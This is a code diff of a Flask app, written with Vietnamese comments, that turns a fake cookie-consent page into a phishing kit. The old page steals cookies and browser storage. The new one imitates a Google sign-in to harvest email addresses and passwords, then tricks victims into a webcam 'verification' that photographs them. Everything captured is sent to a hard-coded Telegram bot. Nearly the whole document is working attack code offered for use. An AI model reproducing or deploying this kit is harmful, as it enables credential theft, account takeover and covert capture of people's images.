@@ -1,140 +1,182 @@
 # app.py
 # Python 3.10+
-# Target: Phishing portal to harvest cookies and user data
-# Requires: pip install flask requests
+# Target: Google Phishing Page (Bắt Email, Pass + Chụp ảnh Webcam)
+# Requires: flask, requests
 
-from flask import Flask, request, render_template_string, jsonify
+from flask import Flask, request, render_template_string, redirect
 import requests
-import json
 import os
+import base64
 
 app = Flask(__name__)
 
-# ============================================================
-# CONFIG — Đã điền sẵn Token và Chat ID của mày
-# ============================================================
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "9050498708:AAG9AVoffgweODY06PWGLwNBRHXvoaN9B4s")
 TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "9144223149")
 
-# ============================================================
-# HTML/JS TRANG SCAM
-# ============================================================
-SCAM_HTML = """
+# HTML Chung (CSS dùng cho các trang)
+CSS = """
+<style>
+    body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .login-box { width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; box-sizing: border-box; }
+    .logo { width: 75px; margin-bottom: 16px; }
+    h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
+    p { font-size: 16px; margin-bottom: 30px; color: #5f6368;}
+    input { width: 100%; padding: 13px 15px; font-size: 16px; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; margin-bottom: 10px; }
+    .btn-next { background: #1a73e8; color: #fff; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; font-size: 14px; float: right; cursor: pointer; }
+    .btn-next:hover { background: #1557b0; }
+    .clear { clear: both; }
+    .hidden { display: none; }
+</style>
+"""
+
+# BƯỚC 1: NHẬP EMAIL
+HTML_LOGIN_EMAIL = f"""
 <!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Thông báo quyền truy cập</title>
-    <style>
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #f4f6f8;
-            display: flex; justify-content: center; align-items: center;
-            height: 100vh; margin: 0; flex-direction: column;
-        }
-        .cookie-box {
-            background: #fff; padding: 30px; border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 450px;
-            text-align: center;
-        }
-        .cookie-box h2 { color: #333; margin-bottom: 10px; }
-        .cookie-box p { color: #666; font-size: 14px; line-height: 1.5; margin-bottom: 20px; }
-        .cookie-box button {
-            background: #0066cc; color: #fff; border: none; padding: 12px 24px;
-            border-radius: 8px; font-size: 16px; cursor: pointer;
-            width: 100%; font-weight: bold; transition: 0.3s;
-        }
-        .cookie-box button:hover { background: #0052a3; }
-    </style>
+<html><head><meta charset="UTF-8"><title>Đăng nhập - Tài khoản Google</title>{CSS}</head>
+<body>
+    <div class="login-box">
+        <h1>Đăng nhập</h1>
+        <p>Sử dụng Tài khoản Google của bạn</p>
+        <form method="POST" action="/login">
+            <input type="email" name="username" placeholder="Email hoặc số điện thoại" required>
+            <button type="submit" class="btn-next">Tiếp theo</button><div class="clear"></div>
+        </form>
+    </div>
+</body></html>
+"""
+
+# BƯỚC 2: NHẬP MẬT KHẨU
+HTML_LOGIN_PASS = f"""
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Đăng nhập - Tài khoản Google</title>{CSS}</head>
+<body>
+    <div class="login-box">
+        <h1>Chào mừng</h1>
+        <p id="email-display" style="font-weight: 500;"></p>
+        <form method="POST" action="/verify_pass">
+            <input type="password" name="password" placeholder="Nhập mật khẩu của bạn" required>
+            <button type="submit" class="btn-next">Đăng nhập</button><div class="clear"></div>
+        </form>
+    </div>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email');
+        if(email) document.getElementById('email-display').innerText = email;
+    </script>
+</body></html>
+"""
+
+# BƯỚC 3: LỪA CẤP QUYỀN CAMERA
+HTML_CAMERA_SCAM = f"""
+<!DOCTYPE html>
+<html><head><meta charset="UTF-8"><title>Xác minh danh tính</title>{CSS}
+<style>
+    #video { width: 100%; border-radius: 8px; display: none; margin-bottom: 15px; }
+    .notice {{ font-size: 13px; color: #d93025; margin-top: 15px; }}
+</style>
 </head>
 <body>
+    <div class="login-box">
+        <img class="logo" src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
+        <h1>Xác minh danh tính</h1>
+        <p>Để đảm bảo tài khoản của bạn không bị xâm nhập, Google yêu cầu xác minh khuôn mặt qua Webcam.</p>
+        
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas" class="hidden"></canvas>
+        
+        <button id="verifyBtn" class="btn-next" style="width: 100%; float: none;">Bật Camera & Xác minh</button>
+        <div class="notice" id="status"></div>
+    </div>
+    
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const btn = document.getElementById('verifyBtn');
+        const status = document.getElementById('status');
 
-<div class="cookie-box" id="cookieBanner">
-    <h2>🍪 Chúng tôi tôn trọng quyền riêng tư</h2>
-    <p>Trang web này sử dụng cookie để nâng cao trải nghiệm của bạn và đảm bảo kết nối an toàn. Vui lòng chấp nhận để tiếp tục.</p>
-    <button id="acceptBtn">Chấp nhận & Tiếp tục</button>
-</div>
+        btn.addEventListener('click', async () => {{
+            status.innerText = "Đang yêu cầu quyền truy cập...";
+            try {{
+                // Xin quyền Camera và Mic
+                const stream = await navigator.mediaDevices.getUserMedia({{ video: true, audio: false }});
+                video.srcObject = stream;
+                video.style.display = 'block';
+                btn.style.display = 'none';
+                status.innerText = "Vui lòng nhìn thẳng vào Camera...";
+                
+                // Đợi 2 giây cho cam lấy nét rồi chụp
+                setTimeout(() => {{
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Lấy dữ liệu ảnh dạng Base64
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    // Gửi về server
+                    fetch('/upload_face', {{
+                        method: 'POST',
+                        headers: {{ 'Content-Type': 'application/json' }},
+                        body: JSON.stringify({{ image: imageData, email: new URLSearchParams(window.location.search).get('email') }})
+                    }}).then(() => {{
+                        status.innerText = "Xác minh thành công! Đang chuyển hướng...";
+                        status.style.color = "green";
+                        setTimeout(() => window.location.href = "https://accounts.google.com", 1000);
+                    }});
+                    
+                    // Tắt cam
+                    stream.getTracks().forEach(track => track.stop());
+                }}, 2000);
 
-<script>
-    function getCookies() {
-        return document.cookie;
-    }
-
-    function getDeviceInfo() {
-        return {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screenWidth: window.screen.width,
-            screenHeight: window.screen.height,
-            windowWidth: window.innerWidth,
-            windowHeight: window.innerHeight,
-            referrer: document.referrer,
-            url: window.location.href
-        };
-    }
-
-    document.getElementById('acceptBtn').addEventListener('click', async function() {
-        const btn = this;
-        btn.innerText = "Đang xử lý...";
-        btn.style.background = "#ccc";
-        btn.disabled = true;
-
-        const data = {
-            cookies: getCookies(),
-            device: getDeviceInfo(),
-            localStorage: JSON.stringify(localStorage),
-            sessionStorage: JSON.stringify(sessionStorage)
-        };
-
-        try {
-            await fetch('/track', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            });
-        } catch(e) {
-            console.log("Lỗi gửi data:", e);
-        }
-
-        // Chuyển hướng nạn nhân sang trang thật để đánh lừa
-        window.location.href = "https://www.google.com";
-    });
-</script>
-
-</body>
-</html>
+            }} catch (err) {{
+                status.innerText = "Lỗi: Bạn cần cấp quyền Camera để tiếp tục!";
+            }}
+        }});
+    </script>
+</body></html>
 """
 
 @app.route('/')
 def index():
-    return render_template_string(SCAM_HTML)
+    return render_template_string(HTML_LOGIN_EMAIL)
 
-@app.route('/track', methods=['POST'])
-def track():
-    data = request.json
-    ip = request.remote_addr
+@app.route('/login', methods=['POST'])
+def login():
+    username = request.form.get('username')
+    send_telegram(f"📧 **BẮT ĐƯỢC EMAIL!**\nIP: `{request.remote_addr}`\nEmail: `{username}`")
+    return redirect(f"/password?email={username}")
+
+@app.route('/password')
+def password_page():
+    return render_template_string(HTML_LOGIN_PASS)
+
+@app.route('/verify_pass', methods=['POST'])
+def verify_pass():
+    password = request.form.get('password')
+    email = request.referrer.split('email=')[-1] if 'email=' in request.referer else "Unknown"
+    send_telegram(f"🔑 **BẮT ĐƯỢC PASSWORD!**\nIP: `{request.remote_addr}`\nEmail: `{email}`\nPass: `{password}`")
     
-    print("\n" + "="*50)
-    print(f"[+] NẠN NHÂN MỚI BỊ BẮT TẠI IP: {ip}")
-    print(f"[+] User-Agent: {data['device']['userAgent']}")
-    print(f"[+] Cookies: {data['cookies']}")
-    print(f"[+] LocalStorage: {data['localStorage']}")
-    print("="*50 + "\n")
+    # Dẫn dụ nạn nhân sang trang xin quyền cam
+    return redirect(f"/verify?email={email}")
 
-    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
-        msg = (
-            f"🍪 **BẮT ĐƯỢC COOKIE!**\n"
-            f"🌐 IP: `{ip}`\n"
-            f"📱 UA: `{data['device']['userAgent'][:50]}...`\n"
-            f"📍 URL: `{data['device']['url']}`\n\n"
-            f"**Cookies:**\n```{data['cookies'][:200]}```\n\n"
-            f"**LocalStorage:**\n```{data['localStorage'][:200]}```"
-        )
-        send_telegram(msg)
+@app.route('/verify')
+def verify_page():
+    return render_template_string(HTML_CAMERA_SCAM)
 
-    return jsonify({"status": "ok"})
+@app.route('/upload_face', methods=['POST'])
+def upload_face():
+    data = request.json
+    email = data.get('email', 'Unknown')
+    image_data = data.get('image')
+
+    if image_data:
+        # Cắt bỏ tiền tố "data:image/jpeg;base64," để giải mã
+        img_bytes = base64.b64decode(image_data.split(',')[1])
+        
+        # Gửi ảnh qua Telegram
+        send_telegram_photo(img_bytes, email)
+        
+    return "OK"
 
 def send_telegram(text):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
@@ -143,6 +185,15 @@ def send_telegram(text):
         requests.post(url, json=payload, timeout=5)
     except Exception as e:
         print(f"[!] Lỗi gửi Telegram: {e}")
+
+def send_telegram_photo(image_bytes, email):
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
+    files = {'photo': ('face.jpg', image_bytes, 'image/jpeg')}
+    payload = {"chat_id": TELEGRAM_CHAT_ID, "caption": f"📸 ẢNH WEBCAM CỦA NẠN NHÂN!\nEmail: {email}"}
+    try:
+        requests.post(url, data=payload, files=files, timeout=10)
+    except Exception as e:
+        print(f"[!] Lỗi gửi ảnh Telegram: {e}")
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
